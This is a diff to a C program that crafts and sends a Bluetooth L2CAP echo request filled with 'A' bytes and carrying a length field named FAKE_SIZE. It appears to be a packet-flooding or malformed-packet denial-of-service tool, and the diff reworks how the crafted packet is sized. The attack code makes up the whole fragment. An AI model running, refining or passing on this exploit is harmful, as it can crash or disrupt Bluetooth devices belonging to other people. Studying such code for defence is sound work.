@@ -68,20 +68,20 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	
-	if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
-	{
+	// Dynamically allocate memory for the buffer based on the FAKE_SIZE
+	if(!(buffer = (char *) malloc ((int) FAKE_SIZE + sizeof(l2cap_cmd_hdr))) {
 		perror("malloc");
 		exit(EXIT_FAILURE);
 	}
 	
-	memset(buffer, 'A', SIZE);
+	memset(buffer, 'A', FAKE_SIZE);
 
 	cmd = (l2cap_cmd_hdr *) buffer;
 	cmd->code = L2CAP_ECHO_REQ;
 	cmd->ident = 1;
 	cmd->len = FAKE_SIZE;
 	
-	if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
+	if( (sent=send(sock, buffer, FAKE_SIZE + sizeof(l2cap_cmd_hdr), 0)) >= 0)
 	{
 		printf("L2CAP packet sent (%d)\n", sent);
 	}
@@ -95,3 +95,4 @@ int main(int argc, char **argv)
 	close(sock);
 	return EXIT_SUCCESS;
 }
+
